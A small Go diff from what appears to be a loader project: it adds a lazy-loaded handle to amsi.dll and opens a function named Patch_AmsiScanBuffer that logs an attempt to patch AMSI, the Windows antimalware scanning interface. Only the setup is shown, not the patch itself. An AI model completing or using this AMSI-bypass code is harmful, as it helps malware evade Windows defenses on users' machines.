@@ -8,6 +8,10 @@ import (
 	"github.com/mszatanik/goloader/pkg/win32"
 )
 
+var (
+	amsidll = syscall.NewLazyDLL("amsi.dll")
+)
+
 func Patch_AmsiScanBuffer() {
 	log.Println("[*] attepmting to patch AMSI")
 
